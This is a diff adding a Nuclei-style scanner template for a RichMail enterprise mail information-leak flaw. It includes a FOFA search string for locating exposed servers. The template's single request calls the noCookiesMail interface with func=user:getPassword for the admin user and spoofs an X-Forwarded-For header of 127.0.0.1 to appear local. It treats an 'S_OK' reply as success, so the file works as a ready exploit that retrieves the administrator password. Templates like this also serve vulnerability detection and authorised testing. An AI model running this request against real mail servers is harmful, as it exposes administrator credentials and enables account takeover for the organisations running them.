@@ -1,0 +1,25 @@
+id: richmail-infoleak
+
+info:
+  name: RichMail Password InfoLeak
+  author: rj
+  severity: high
+  description: |
+    RickMail noCookiesMail 接口存在信息泄露漏洞。
+    fofa: "Richmail 企业邮箱"
+  tags: Richmail
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin"
+    headers:
+      X-Forwarded-For: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "S_OK"
